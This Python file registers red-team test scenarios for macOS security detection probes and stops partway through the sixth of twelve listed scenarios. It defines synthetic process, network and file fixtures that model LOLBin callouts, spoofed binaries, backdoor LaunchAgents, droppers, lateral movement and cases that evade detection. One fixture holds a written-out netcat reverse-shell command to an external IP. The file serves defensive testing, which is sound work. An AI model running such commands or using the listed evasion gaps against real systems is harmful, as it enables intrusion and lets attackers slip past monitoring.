"""macOS Correlation Red-Team Scenarios — adversarial tests for cross-agent probes.

12 scenarios covering all 12 correlation probes, testing the cross-domain
detection patterns that close 17 of 22 evasion gaps from the Evasion Gauntlet.

Scenarios:
    1.  macos_corr_process_network — LOLBin + external connection
    2.  macos_corr_binary_identity — process name vs binary path
    3.  macos_corr_persistence_execution — installed + running
    4.  macos_corr_download_execute — download → execute → connect
    5.  macos_corr_lateral_movement — internal movement on service ports
    6.  macos_corr_unknown_listener — unexpected open ports
    7.  macos_corr_cumulative_auth — slow brute force across scans
    8.  macos_corr_cumulative_exfil — slow exfil across scans
    9.  macos_corr_kill_chain — multi-tactic progression
    10. macos_corr_file_size_anomaly — benign name, suspicious size
    11. macos_corr_scheduled_persistence — at-job/periodic/emond
    12. macos_corr_auth_geo_anomaly — new source IP

Each scenario has 6-8 cases: mix of positive, evasion, benign.
"""

from __future__ import annotations

import os
import time
from collections import defaultdict
from dataclasses import field
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional

from amoskys.agents.common.probes import Severity
from amoskys.agents.os.macos.auth.collector import AuthEvent
from amoskys.agents.os.macos.correlation.probes import (
    AuthGeoAnomalyProbe,
    BinaryIdentityProbe,
    CumulativeAuthProbe,
    CumulativeExfilProbe,
    DownloadExecuteChainProbe,
    FileSizeAnomalyProbe,
    KillChainProgressionProbe,
    LateralMovementProbe,
    PersistenceExecutionProbe,
    ProcessNetworkProbe,
    ScheduledPersistenceProbe,
    UnknownListenerProbe,
)
from amoskys.agents.os.macos.correlation.rolling_window import RollingWindowAggregator
from amoskys.agents.os.macos.filesystem.collector import FileEntry
from amoskys.agents.os.macos.network.collector import Connection, ProcessBandwidth
from amoskys.agents.os.macos.persistence.collector import PersistenceEntry
from amoskys.agents.os.macos.process.collector import ProcessSnapshot
from amoskys.redteam.harness import AdversarialCase, Scenario
from amoskys.redteam.scenarios import register

# ─── Timestamp anchors ──────────────────────────────────────────────────────

_T0 = int(1_700_000_000 * 1e9)
_NOW = datetime(2024, 11, 15, 2, 30, 0, tzinfo=timezone.utc)


# ─── Factory helpers ─────────────────────────────────────────────────────────


def _proc(
    pid: int = 1000,
    name: str = "test",
    exe: Optional[str] = None,
    cmdline: Optional[List[str]] = None,
    username: str = "testuser",
    ppid: int = 1,
    parent_name: str = "launchd",
    create_time: float = 1700000000.0,
    cpu_percent: Optional[float] = 0.0,
    memory_percent: Optional[float] = 0.1,
    status: str = "running",
    cwd: str = "/",
    environ: Optional[Dict[str, str]] = None,
    is_own_user: bool = True,
    process_guid: str = "test0000",
) -> ProcessSnapshot:
    return ProcessSnapshot(
        pid=pid,
        name=name,
        exe=exe if exe is not None else f"/usr/bin/{name}",
        cmdline=cmdline if cmdline is not None else [name],
        username=username,
        ppid=ppid,
        parent_name=parent_name,
        create_time=create_time,
        cpu_percent=cpu_percent,
        memory_percent=memory_percent,
        status=status,
        cwd=cwd,
        environ=environ,
        is_own_user=is_own_user,
        process_guid=process_guid,
    )


def _conn(
    pid: int = 2000,
    process_name: str = "sshd",
    user: str = "root",
    protocol: str = "TCP",
    local_addr: str = "0.0.0.0:22",
    remote_addr: str = "",
    state: str = "LISTEN",
    local_ip: str = "0.0.0.0",
    local_port: int = 22,
    remote_ip: str = "",
    remote_port: int = 0,
) -> Connection:
    return Connection(
        pid=pid,
        process_name=process_name,
        user=user,
        protocol=protocol,
        local_addr=local_addr,
        remote_addr=remote_addr,
        state=state,
        local_ip=local_ip,
        local_port=local_port,
        remote_ip=remote_ip,
        remote_port=remote_port,
    )


def _pentry(
    category: str = "launchagent_user",
    path: str = "/tmp/test.plist",
    name: str = "test.plist",
    content_hash: str = "abc123",
    program: str = "/bin/sh",
    label: str = "com.test.agent",
    run_at_load: bool = True,
    keep_alive: bool = False,
    metadata: Optional[Dict[str, Any]] = None,
) -> PersistenceEntry:
    return PersistenceEntry(
        category=category,
        path=path,
        name=name,
        content_hash=content_hash,
        metadata=metadata or {},
        program=program,
        label=label,
        run_at_load=run_at_load,
        keep_alive=keep_alive,
    )


def _file(
    path: str = "/Users/testuser/Downloads/test.txt",
    name: str = "test.txt",
    sha256: str = "deadbeef" * 8,
    mtime: float = 1700000000.0,
    size: int = 1024,
    mode: int = 0o100644,
    uid: int = 501,
    is_suid: bool = False,
) -> FileEntry:
    return FileEntry(
        path=path,
        name=name,
        sha256=sha256,
        mtime=mtime,
        size=size,
        mode=mode,
        uid=uid,
        is_suid=is_suid,
    )


def _auth(
    timestamp: Optional[datetime] = None,
    process: str = "sudo",
    message: str = "testuser : COMMAND=/bin/ls",
    category: str = "sudo",
    source_ip: Optional[str] = None,
    username: Optional[str] = "testuser",
    event_type: str = "success",
) -> AuthEvent:
    return AuthEvent(
        timestamp=timestamp or _NOW,
        process=process,
        message=message,
        category=category,
        source_ip=source_ip,
        username=username,
        event_type=event_type,
    )


def _bw(
    pid: int = 2000,
    process_name: str = "curl",
    bytes_in: int = 0,
    bytes_out: int = 0,
) -> ProcessBandwidth:
    return ProcessBandwidth(
        pid=pid,
        process_name=process_name,
        bytes_in=bytes_in,
        bytes_out=bytes_out,
    )


def _rolling_with(*entries: tuple) -> RollingWindowAggregator:
    """Build a pre-populated rolling window for test scenarios."""
    r = RollingWindowAggregator(window_seconds=300.0)
    now = time.time()
    for key, value in entries:
        r.add(key, value, now)
    return r


def _pid_connections(
    processes: List[ProcessSnapshot], connections: List[Connection]
) -> Dict[int, List[Connection]]:
    """Build PID→connections index."""
    result: Dict[int, List[Connection]] = defaultdict(list)
    for c in connections:
        result[c.pid].append(c)
    return dict(result)


# =============================================================================
# 1. ProcessNetwork — LOLBin + external connection
# =============================================================================

register(
    Scenario(
        probe_id="macos_corr_process_network",
        agent="macos_correlation",
        name="macos_corr_process_network",
        title="LOLBin process with outbound external connection",
        description="Correlates LOLBin exe paths with outbound network connections to close benign-parent whitelist gaps.",
        mitre_techniques=["T1059", "T1071"],
        mitre_tactics=["execution", "command-and-control"],
        probe_factory=ProcessNetworkProbe,
        cases=[
            # POS: curl with external connection → CAUGHT
            AdversarialCase(
                id="corr_pn_curl_external",
                title="curl with external connection",
                category="positive",
                description="curl makes outbound HTTPS to C2 server",
                why="exe basename 'curl' in _LOLBIN_BASENAMES + external connection = fire",
                events=[
                    _proc(
                        pid=5001,
                        name="curl",
                        exe="/usr/bin/curl",
                        parent_name="zsh",
                        process_guid="pn001",
                    )
                ],
                shared_data_key="processes",
                extra_context={
                    "pid_connections": {
                        5001: [
                            _conn(
                                pid=5001,
                                process_name="curl",
                                state="ESTABLISHED",
                                remote_ip="185.220.101.42",
                                remote_port=443,
                            )
                        ],
                    },
                },
                expect_count=1,
                expect_event_types=["corr_lolbin_network"],
                expect_severity=Severity.HIGH,
            ),
            # POS: nc (netcat) reverse shell → CAUGHT
            AdversarialCase(
                id="corr_pn_nc_reverse_shell",
                title="nc reverse shell to external IP",
                category="positive",
                description="netcat establishing reverse shell to C2",
                why="exe basename 'nc' + external connection = reverse shell",
                events=[
                    _proc(
                        pid=5002,
                        name="nc",
                        exe="/usr/bin/nc",
                        cmdline=["nc", "-e", "/bin/sh", "45.33.32.1", "4444"],
                        parent_name="bash",
                        process_guid="pn002",
                    )
                ],
                shared_data_key="processes",
                extra_context={
                    "pid_connections": {
                        5002: [
                            _conn(
                                pid=5002,
                                process_name="nc",
                                state="ESTABLISHED",
                                remote_ip="45.33.32.1",
                                remote_port=4444,
                            )
                        ],
                    },
                },
                expect_count=1,
                expect_event_types=["corr_lolbin_network"],
                expect_severity=Severity.HIGH,
            ),
            # POS: renamed curl as 'updater' but exe is /usr/bin/curl → CAUGHT by exe path
            AdversarialCase(
                id="corr_pn_renamed_lolbin",
                title="Renamed LOLBin (exe /usr/bin/curl, name 'updater')",
                category="positive",
                description="Attacker renames curl to 'updater' but exe path reveals truth",
                why="exe basename 'curl' detected regardless of process name",
                events=[
                    _proc(
                        pid=5003,
                        name="updater",
                        exe="/usr/bin/curl",
                        parent_name="helper",
                        process_guid="pn003",
                    )
                ],
                shared_data_key="processes",
                extra_context={
                    "pid_connections": {
                        5003: [
                            _conn(
                                pid=5003,
                                process_name="updater",
                                state="ESTABLISHED",
                                remote_ip="198.51.100.10",
                                remote_port=8080,
                            )
                        ],
                    },
                },
                expect_count=1,
                expect_event_types=["corr_lolbin_network"],
            ),
            # BENIGN: curl with NO connections → skip
            AdversarialCase(
                id="corr_pn_curl_no_network",
                title="curl running but no outbound connections",
                category="benign",
                description="curl is running but hasn't connected to anything",
                why="No outbound connections → no correlation signal",
                events=[
                    _proc(
                        pid=5004,
                        name="curl",
                        exe="/usr/bin/curl",
                        parent_name="zsh",
                        process_guid="pn004",
                    )
                ],
                shared_data_key="processes",
                extra_context={"pid_connections": {}},
                expect_count=0,
                expect_evades=True,
            ),
            # BENIGN: curl with internal-only connection → skip
            AdversarialCase(
                id="corr_pn_curl_internal_only",
                title="curl connecting to internal host only",
                category="benign",
                description="curl connecting to 192.168.1.1 — internal traffic",
                why="Private IP connections are not flagged",
                events=[
                    _proc(
                        pid=5005,
                        name="curl",
                        exe="/usr/bin/curl",
                        parent_name="zsh",
                        process_guid="pn005",
                    )
                ],
                shared_data_key="processes",
                extra_context={
                    "pid_connections": {
                        5005: [
                            _conn(
                                pid=5005,
                                process_name="curl",
                                state="ESTABLISHED",
                                remote_ip="192.168.1.1",
                                remote_port=80,
                            )
                        ],
                    },
                },
                expect_count=0,
                expect_evades=True,
            ),
            # BENIGN: non-LOLBin with external connection → skip
            AdversarialCase(
                id="corr_pn_safari_external",
                title="Safari with external connection (not a LOLBin)",
                category="benign",
                description="Safari browsing is normal, not a LOLBin",
                why="exe basename 'Safari' not in _LOLBIN_BASENAMES",
                events=[
                    _proc(
                        pid=5006,
                        name="Safari",
                        exe="/Applications/Safari.app/Contents/MacOS/Safari",
                        parent_name="launchd",
                        process_guid="pn006",
                    )
                ],
                shared_data_key="processes",
                extra_context={
                    "pid_connections": {
                        5006: [
                            _conn(
                                pid=5006,
                                process_name="Safari",
                                state="ESTABLISHED",
                                remote_ip="17.253.144.10",
                                remote_port=443,
                            )
                        ],
                    },
                },
                expect_count=0,
                expect_evades=True,
            ),
            # EVASION: LOLBin with empty exe → can't validate
            AdversarialCase(
                id="corr_pn_lolbin_no_exe",
                title="LOLBin process with empty exe path (cross-user)",
                category="evasion",
                description="Root-owned curl has empty exe (permission denied)",
                why="Empty exe → can't determine if LOLBin → skip",
                events=[
                    _proc(
                        pid=5007,
                        name="curl",
                        exe="",
                        parent_name="launchd",
                        is_own_user=False,
                        process_guid="pn007",
                    )
                ],
                shared_data_key="processes",
                extra_context={
                    "pid_connections": {
                        5007: [
                            _conn(
                                pid=5007,
                                process_name="curl",
                                state="ESTABLISHED",
                                remote_ip="185.220.101.42",
                                remote_port=443,
                            )
                        ],
                    },
                },
                expect_count=0,
                expect_evades=True,
            ),
        ],
    )
)


# =============================================================================
# 2. BinaryIdentity — process name vs binary path
# =============================================================================

register(
    Scenario(
        probe_id="macos_corr_binary_identity",
        agent="macos_correlation",
        name="macos_corr_binary_identity",
        title="Process name does not match expected binary location",
        description="Validates whitelisted process names against expected binary paths to defeat name spoofing.",
        mitre_techniques=["T1036"],
        mitre_tactics=["defense-evasion"],
        probe_factory=BinaryIdentityProbe,
        cases=[
            # POS: fake 'claude' binary from /tmp
            AdversarialCase(
                id="corr_bi_fake_claude",
                title="Process named 'claude' running from /tmp/",
                category="positive",
                description="Attacker creates binary named 'claude' to bypass C2 whitelist",
                why="'claude' expected in /Applications/Claude.app/ but exe is /tmp/claude",
                events=[
                    _proc(
                        pid=6001, name="claude", exe="/tmp/claude", process_guid="bi001"
                    )
                ],
                shared_data_key="processes",
                expect_count=1,
                expect_event_types=["corr_binary_identity_mismatch"],
                expect_severity=Severity.CRITICAL,
            ),
            # POS: fake 'Slack Helper' from /var/tmp
            AdversarialCase(
                id="corr_bi_fake_slack",
                title="Process named 'slack helper' from /var/tmp",
                category="positive",
                description="Attacker mimics Slack Helper to evade C2 detection",
                why="'slack helper' expected in /Applications/Slack.app/ but running from /var/tmp",
                events=[
                    _proc(
                        pid=6002,
                        name="slack helper",
                        exe="/var/tmp/slack_helper",
                        process_guid="bi002",
                    )
                ],
                shared_data_key="processes",
                expect_count=1,
                expect_event_types=["corr_binary_identity_mismatch"],
                expect_severity=Severity.CRITICAL,
            ),
            # POS: fake 'chrome' from /var/tmp
            AdversarialCase(
                id="corr_bi_fake_chrome",
                title="Process named 'google chrome' running from /var/tmp",
                category="positive",
                description="Attacker binary spoofing Chrome to evade C2 detection",
                why="'google chrome' expected in /Applications/Google Chrome.app/ but from /var/tmp",
                events=[
                    _proc(
                        pid=6006,
                        name="google chrome",
                        exe="/var/tmp/chrome",
                        process_guid="bi006",
                    )
                ],
                shared_data_key="processes",
                expect_count=1,
                expect_event_types=["corr_binary_identity_mismatch"],
                expect_severity=Severity.CRITICAL,
            ),
            # BENIGN: real Claude from correct path
            AdversarialCase(
                id="corr_bi_real_claude",
                title="Real Claude.app running from /Applications/",
                category="benign",
                description="Legitimate Claude application",
                why="exe starts with /Applications/Claude.app/ → matches expected prefix",
                events=[
                    _proc(
                        pid=6003,
                        name="claude",
                        exe="/Applications/Claude.app/Contents/MacOS/Claude",
                        process_guid="bi003",
                    )
                ],
                shared_data_key="processes",
                expect_count=0,
                expect_evades=True,
            ),
            # BENIGN: process name not in identity map → skip
            AdversarialCase(
                id="corr_bi_unknown_name",
                title="Process with unknown name (not in identity map)",
                category="benign",
                description="Random process name not tracked for identity",
                why="Name 'myapp' not in _EXPECTED_BINARY_PREFIXES → not checked",
                events=[
                    _proc(
                        pid=6004, name="myapp", exe="/tmp/myapp", process_guid="bi004"
                    )
                ],
                shared_data_key="processes",
                expect_count=0,
                expect_evades=True,
            ),
            # EVASION: fake Claude with empty exe
            AdversarialCase(
                id="corr_bi_empty_exe",
                title="Process named 'claude' with empty exe (cross-user)",
                category="evasion",
                description="Can't validate binary path without exe",
                why="Empty exe → skip validation",
                events=[
                    _proc(
                        pid=6005,
                        name="claude",
                        exe="",
                        is_own_user=False,
                        process_guid="bi005",
                    )
                ],
                shared_data_key="processes",
                expect_count=0,
                expect_evades=True,
            ),
        ],
    )
)


# =============================================================================
# 3. PersistenceExecution — installed + running
# =============================================================================

register(
    Scenario(
        probe_id="macos_corr_persistence_execution",
        agent="macos_correlation",
        name="macos_corr_persistence_execution",
        title="Persistence mechanism with active process execution",
        description="Correlates new persistence entries with running processes to confirm active threats.",
        mitre_techniques=["T1543", "T1547"],
        mitre_tactics=["persistence", "execution"],
        probe_factory=PersistenceExecutionProbe,
        cases=[
            # Baseline scan (stateful chain — first scan learns)
            AdversarialCase(
                id="corr_pe_baseline",
                title="Baseline: existing persistence entries",
                category="benign",
                description="First scan — learn baseline programs",
                why="First run → baseline → 0 events",
                events=[
                    _pentry(program="/usr/local/bin/legit", label="com.legit.service")
                ],
                shared_data_key="entries",
                extra_context={
                    "processes": [
                        _proc(pid=7001, name="legit", exe="/usr/local/bin/legit")
                    ],
                },
                stateful=True,
                expect_count=0,
                expect_evades=True,
            ),
            # POS: new LaunchAgent + program running → CAUGHT
            AdversarialCase(
                id="corr_pe_new_running",
                title="New LaunchAgent whose program is actively running",
                category="positive",
                description="Malware installed LaunchAgent and is already executing",
                why="New program not in baseline + exe in running processes = active threat",
                events=[
                    _pentry(program="/usr/local/bin/legit", label="com.legit.service"),
                    _pentry(
                        program="/tmp/backdoor",
                        path="/Users/testuser/Library/LaunchAgents/com.evil.plist",
                        label="com.evil.backdoor",
                        content_hash="evil123",
                    ),
                ],
                shared_data_key="entries",
                extra_context={
                    "processes": [
                        _proc(pid=7001, name="legit", exe="/usr/local/bin/legit"),
                        _proc(pid=7002, name="backdoor", exe="/tmp/backdoor"),
                    ],
                },
                stateful=True,
                expect_count=1,
                expect_event_types=["corr_persistence_active"],
                expect_severity=Severity.CRITICAL,
            ),
            # Chain break
            AdversarialCase(
                id="corr_pe_chain_break",
                title="Chain break — reset probe state",
                category="benign",
                description="Chain breaker to reset probe",
                why="stateful=False resets probe",
                events=[],
                shared_data_key="entries",
                extra_context={"processes": []},
                stateful=False,
                expect_count=0,
                expect_evades=True,
            ),
            # Baseline for next test
            AdversarialCase(
                id="corr_pe_baseline2",
                title="Baseline: empty persistence",
                category="benign",
                description="Second chain — empty baseline",
                why="First run → baseline",
                events=[],
                shared_data_key="entries",
                extra_context={"processes": []},
                stateful=True,
                expect_count=0,
                expect_evades=True,
            ),
            # POS: new LaunchDaemon + running → CAUGHT
            AdversarialCase(
                id="corr_pe_daemon_running",
                title="New LaunchDaemon with active process",
                category="positive",
                description="Root daemon installed and immediately running",
                why="New daemon program + exe in process list = active threat",
                events=[
                    _pentry(
                        program="/usr/local/bin/miner",
                        path="/Library/LaunchDaemons/com.miner.plist",
                        label="com.miner.daemon",
                        content_hash="mine999",
                        category="launchdaemon_system",
                    ),
                ],
                shared_data_key="entries",
                extra_context={
                    "processes": [
                        _proc(pid=7003, name="miner", exe="/usr/local/bin/miner"),
                    ],
                },
                stateful=True,
                expect_count=1,
                expect_event_types=["corr_persistence_active"],
                expect_severity=Severity.CRITICAL,
            ),
            # Chain break 2
            AdversarialCase(
                id="corr_pe_chain_break2",
                title="Chain break 2",
                category="benign",
                description="Reset probe state",
                why="stateful=False",
                events=[],
                shared_data_key="entries",
                extra_context={"processes": []},
                stateful=False,
                expect_count=0,
                expect_evades=True,
            ),
            # Baseline for 3rd positive
            AdversarialCase(
                id="corr_pe_baseline3",
                title="Baseline: existing system service",
                category="benign",
                description="Third chain — learn existing service",
                why="First run → baseline",
                events=[_pentry(program="/usr/sbin/httpd", label="com.apple.httpd")],
                shared_data_key="entries",
                extra_context={
                    "processes": [_proc(pid=7004, name="httpd", exe="/usr/sbin/httpd")]
                },
                stateful=True,
                expect_count=0,
                expect_evades=True,
            ),
            # POS: reverse shell persistence + active
            AdversarialCase(
                id="corr_pe_reverse_shell_active",
                title="Reverse shell LaunchAgent actively running",
                category="positive",
                description="Attacker persistence running reverse shell binary",
                why="New program /tmp/.hidden_shell + running process = active threat",
                events=[
                    _pentry(program="/usr/sbin/httpd", label="com.apple.httpd"),
                    _pentry(
                        program="/tmp/.hidden_shell",
                        path="/Users/testuser/Library/LaunchAgents/com.rev.plist",
                        label="com.rev.shell",
                        content_hash="rev000",
                    ),
                ],
                shared_data_key="entries",
                extra_context={
                    "processes": [
                        _proc(pid=7004, name="httpd", exe="/usr/sbin/httpd"),
                        _proc(pid=7005, name=".hidden_shell", exe="/tmp/.hidden_shell"),
                    ],
                },
                stateful=True,
                expect_count=1,
                expect_event_types=["corr_persistence_active"],
                expect_severity=Severity.CRITICAL,
            ),
            # BENIGN: new LaunchAgent but program NOT running
            AdversarialCase(
                id="corr_pe_installed_not_running",
                title="New LaunchAgent but program not running yet",
                category="benign",
                description="Persistence installed but not yet executing",
                why="Program /tmp/backdoor not in running exe set → skip",
                events=[
                    _pentry(program="/tmp/backdoor", label="com.evil.backdoor"),
                ],
                shared_data_key="entries",
                extra_context={
                    "processes": [
                        _proc(pid=7001, name="legit", exe="/usr/local/bin/legit")
                    ],
                },
                stateful=True,
                expect_count=0,
                expect_evades=True,
            ),
            # EVASION: persistence binary runs under different exe path (symlink/copy)
            AdversarialCase(
                id="corr_pe_different_exe_path",
                title="Persistence program=/tmp/evil but process exe=/var/tmp/evil (copied)",
                category="evasion",
                description="Attacker copies binary so exe path doesn't match program field",
                why="Exact path match fails when binary is copied/symlinked elsewhere",
                events=[
                    _pentry(
                        program="/tmp/evil",
                        label="com.evil.copied",
                        content_hash="copy000",
                    ),
                ],
                shared_data_key="entries",
                extra_context={
                    "processes": [_proc(pid=7010, name="evil", exe="/var/tmp/evil")],
                },
                stateful=True,
                expect_count=0,
                expect_evades=True,
            ),
        ],
    )
)


# =============================================================================
# 4. DownloadExecuteChain — download → execute → connect
# =============================================================================

register(
    Scenario(
        probe_id="macos_corr_download_execute",
        agent="macos_correlation",
        name="macos_corr_download_execute",
        title="Downloaded file executing with outbound connections",
        description="Detects full kill chain: file drop + process execution + outbound C2 connection.",
        mitre_techniques=["T1204", "T1059", "T1071"],
        mitre_tactics=["initial-access", "execution", "command-and-control"],
        probe_factory=DownloadExecuteChainProbe,
        cases=[
            # Baseline
            AdversarialCase(
                id="corr_de_baseline",
                title="Baseline: empty Downloads",
                category="benign",
                description="First scan — learn baseline files",
                why="First run → baseline → 0 events",
                events=[],
                shared_data_key="files",
                extra_context={"processes": [], "pid_connections": {}},
                stateful=True,
                expect_count=0,
                expect_evades=True,
            ),
            # POS: new file in /tmp + executing + outbound
            AdversarialCase(
                id="corr_de_tmp_execute_connect",
                title="New file in /tmp executing with outbound connection",
                category="positive",
                description="Malware dropped in /tmp, executing, connecting to C2",
                why="New file + process exe match + outbound = full chain",
                events=[_file(path="/tmp/implant", name="implant", size=50000)],
                shared_data_key="files",
                extra_context={
                    "processes": [
                        _proc(
                            pid=8001,
                            name="implant",
                            exe="/tmp/implant",
                            process_guid="de001",
                        ),
                    ],
                    "pid_connections": {
                        8001: [
                            _conn(
                                pid=8001,
                                process_name="implant",
                                state="ESTABLISHED",
                                remote_ip="185.220.101.42",
                                remote_port=443,
                            )
                        ],
                    },
                },
                stateful=True,
                expect_count=1,
                expect_event_types=["corr_download_execute_chain"],
                expect_severity=Severity.CRITICAL,
            ),
            # Chain break
            AdversarialCase(
                id="corr_de_chain_break",
                title="Chain break",
                category="benign",
                description="Reset probe state",
                why="stateful=False",
                events=[],
                shared_data_key="files",
                extra_context={"processes": [], "pid_connections": {}},
                stateful=False,
                expect_count=0,
                expect_evades=True,
            ),
            # Baseline for 2nd positive
            AdversarialCase(
                id="corr_de_baseline2",
                title="Baseline: empty",
                category="benign",
                description="Second chain",
                why="First run → baseline",
                events=[],
                shared_data_key="files",
                extra_context={"processes": [], "pid_connections": {}},
                stateful=True,
                expect_count=0,
                expect_evades=True,
            ),
            # POS: new file in /private/tmp + executing + outbound
            AdversarialCase(
                id="corr_de_privatetmp_execute_connect",
                title="New file in /private/tmp executing with outbound C2",
                category="positive",
                description="Dropper in /private/tmp infection chain",
                why="New file in /private/tmp/ + process exe match + outbound = full chain",
                events=[
                    _file(path="/private/tmp/installer", name="installer", size=120000)
                ],
                shared_data_key="files",
                extra_context={
                    "processes": [
                        _proc(
                            pid=8002,
                            name="installer",
                            exe="/private/tmp/installer",
                            process_guid="de002",
                        ),
                    ],
                    "pid_connections": {
                        8002: [
                            _conn(
                                pid=8002,
                                process_name="installer",
                                state="ESTABLISHED",
                                remote_ip="45.33.32.1",
                                remote_port=8443,
                            )
                        ],
                    },
                },
                stateful=True,
                expect_count=1,
                expect_event_types=["corr_download_execute_chain"],
                expect_severity=Severity.CRITICAL,
            ),
            # Chain break 2
            AdversarialCase(
                id="corr_de_chain_break2",
                title="Chain break 2",
                category="benign",
                description="Reset probe state",
                why="stateful=False",
                events=[],
                shared_data_key="files",
                extra_context={"processes": [], "pid_connections": {}},
                stateful=False,
                expect_count=0,
                expect_evades=True,
            ),
            # Baseline for 3rd positive
            AdversarialCase(
                id="corr_de_baseline3",
                title="Baseline: empty",
                category="benign",
                description="Third chain",
                why="First run → baseline",
                events=[],
                shared_data_key="files",
                extra_context={"processes": [], "pid_connections": {}},
                stateful=True,
                expect_count=0,
                expect_evades=True,
            ),
            # POS: dropper in /var/tmp + executing + multiple connections
            AdversarialCase(
                id="corr_de_vartmp_dropper",
                title="Dropper in /var/tmp with multi-C2 connections",
                category="positive",
                description="Dropper placed in /var/tmp executing with multiple C2 callbacks",
                why="New file + process match + multiple outbound = confirmed dropper chain",
                events=[_file(path="/var/tmp/.update", name=".update", size=65536)],
                shared_data_key="files",
                extra_context={
                    "processes": [
                        _proc(
                            pid=8003,
                            name=".update",
                            exe="/var/tmp/.update",
                            process_guid="de003",
                        ),
                    ],
                    "pid_connections": {
                        8003: [
                            _conn(
                                pid=8003,
                                process_name=".update",
                                state="ESTABLISHED",
                                remote_ip="198.51.100.10",
                                remote_port=443,
                            ),
                            _conn(
                                pid=8003,
                                process_name=".update",
                                state="ESTABLISHED",
                                remote_ip="198.51.100.11",
                                remote_port=8080,
                            ),
                        ],
                    },
                },
                stateful=True,
                expect_count=1,
                expect_event_types=["corr_download_execute_chain"],
                expect_severity=Severity.CRITICAL,
            ),
            # Chain break 3
            AdversarialCase(
                id="corr_de_chain_break3",
                title="Chain break 3",
                category="benign",
                description="Reset probe state",
                why="stateful=False",
                events=[],
                shared_data_key="files",
                extra_context={"processes": [], "pid_connections": {}},
                stateful=False,
                expect_count=0,
                expect_evades=True,
            ),
            # Baseline for benign test
            AdversarialCase(
                id="corr_de_baseline4",
                title="Baseline: empty",
                category="benign",
                description="Fourth chain",
                why="First run → baseline",
                events=[],
                shared_data_key="files",
                extra_context={"processes": [], "pid_connections": {}},
                stateful=True,
                expect_count=0,
                expect_evades=True,
            ),
            # BENIGN: new file but NOT executing
            AdversarialCase(
                id="corr_de_dropped_not_running",
                title="New file in /tmp but not executing",
                category="benign",
                description="File downloaded but not yet executed",
                why="No process with matching exe → no chain",
                events=[_file(path="/tmp/payload.bin", name="payload.bin")],
                shared_data_key="files",
                extra_context={"processes": [], "pid_connections": {}},
                stateful=True,
                expect_count=0,
                expect_evades=True,
            ),
            # EVASION: file dropped outside watched dirs (e.g. /opt/)
            AdversarialCase(
                id="corr_de_outside_watched_dir",
                title="File in /opt/ — outside watched directories",
                category="evasion",
                description="Attacker drops binary in unwatched directory",
                why="/opt/ not in _WATCH_PREFIXES or ~/Downloads → invisible",
                events=[_file(path="/opt/evil/implant", name="implant", size=50000)],
                shared_data_key="files",
                extra_context={
                    "processes": [
                        _proc(
                            pid=8010,
                            name="implant",
                            exe="/opt/evil/implant",
                            process_guid="de010",
                        ),
                    ],
                    "pid_connections": {
                        8010: [
                            _conn(
                                pid=8010,
                                process_name="implant",
                                state="ESTABLISHED",
                                remote_ip="185.220.101.42",
                                remote_port=443,
                            )
                        ],
                    },
                },
                stateful=True,
                expect_count=0,
                expect_evades=True,
            ),
        ],
    )
)


# =============================================================================
# 5. LateralMovement — internal movement on service ports
# =============================================================================

register(
    Scenario(
        probe_id="macos_corr_lateral_movement",
        agent="macos_correlation",
        name="macos_corr_lateral_movement",
        title="Outbound connection to internal host on service port",
        description="Expands lateral movement detection to SSH, SMB, RDP, VNC, and WinRM ports.",
        mitre_techniques=["T1021", "T1570"],
        mitre_tactics=["lateral-movement"],
        probe_factory=LateralMovementProbe,
        cases=[
            # POS: SMB to internal host
            AdversarialCase(
                id="corr_lm_smb_internal",
                title="SMB connection to internal host (port 445)",
                category="positive",
                description="Lateral movement via SMB to file server",
                why="ESTABLISHED + private IP + port 445 = lateral SMB",
                events=[
                    _conn(
                        pid=9001,
                        process_name="smbclient",
                        state="ESTABLISHED",
                        remote_ip="192.168.1.100",
                        remote_port=445,
                    )
                ],
                shared_data_key="connections",
                expect_count=1,
                expect_event_types=["corr_lateral_movement"],
                expect_severity=Severity.HIGH,
            ),
            # POS: VNC to internal host
            AdversarialCase(
                id="corr_lm_vnc_internal",
                title="VNC connection to internal host (port 5900)",
                category="positive",
                description="Remote desktop control via VNC",
                why="ESTABLISHED + private IP + port 5900 = lateral VNC",
                events=[
                    _conn(
                        pid=9002,
                        process_name="screensharingd",
                        state="ESTABLISHED",
                        remote_ip="10.0.0.50",
                        remote_port=5900,
                    )
                ],
                shared_data_key="connections",
                expect_count=1,
                expect_event_types=["corr_lateral_movement"],
            ),
            # POS: RDP to internal host
            AdversarialCase(
                id="corr_lm_rdp_internal",
                title="RDP connection to internal host (port 3389)",
                category="positive",
                description="Remote desktop via RDP to Windows host",
                why="ESTABLISHED + private IP + port 3389 = lateral RDP",
                events=[
                    _conn(
                        pid=9003,
                        process_name="rdp_client",
                        state="ESTABLISHED",
                        remote_ip="172.16.0.10",
                        remote_port=3389,
                    )
                ],
                shared_data_key="connections",
                expect_count=1,
                expect_event_types=["corr_lateral_movement"],
            ),
            # BENIGN: SSH to external IP → not lateral
            AdversarialCase(
                id="corr_lm_ssh_external",
                title="SSH to external IP (not lateral movement)",
                category="benign",
                description="SSH to external server is normal remote access",
                why="External IP → not lateral movement",
                events=[
                    _conn(
                        pid=9004,
                        process_name="ssh",
                        state="ESTABLISHED",
                        remote_ip="203.0.113.50",
                        remote_port=22,
                    )
                ],
                shared_data_key="connections",
                expect_count=0,
                expect_evades=True,
            ),
            # BENIGN: connection to internal IP on non-lateral port
            AdversarialCase(
                id="corr_lm_http_internal",
                title="HTTP to internal host (port 80, not a lateral port)",
                category="benign",
                description="Internal web traffic is not lateral movement",
                why="Port 80 not in _LATERAL_PORTS → skip",
                events=[
                    _conn(
                        pid=9005,
                        process_name="curl",
                        state="ESTABLISHED",
                        remote_ip="192.168.1.1",
                        remote_port=80,
                    )
                ],
                shared_data_key="connections",
                expect_count=0,
                expect_evades=True,
            ),
            # EVASION: LISTEN state (not ESTABLISHED)
            AdversarialCase(
                id="corr_lm_listen_state",
                title="SMB LISTEN state (not outbound)",
                category="evasion",
                description="Listening is not outbound movement",
                why="state != ESTABLISHED → skip",
                events=[
                    _conn(
                        pid=9006,
                        process_name="smbd",
                        state="LISTEN",
                        local_ip="0.0.0.0",
                        local_port=445,
                        remote_ip="",
                        remote_port=0,
                    )
                ],
                shared_data_key="connections",
                expect_count=0,
                expect_evades=True,
            ),
        ],
    )
)


# =============================================================================
# 6. UnknownListener — unexpected open ports
# =============================================================================

register(
    Scenario(
        probe_id="macos_corr_unknown_listener",
        agent="macos_correlation",
        name="macos_corr_unknown_listener",
        title="Unknown process listening on suspicious port",
        description="Flags unknown processes listening on C2 ports or privileged ports.",
        mitre_techniques=["T1571"],
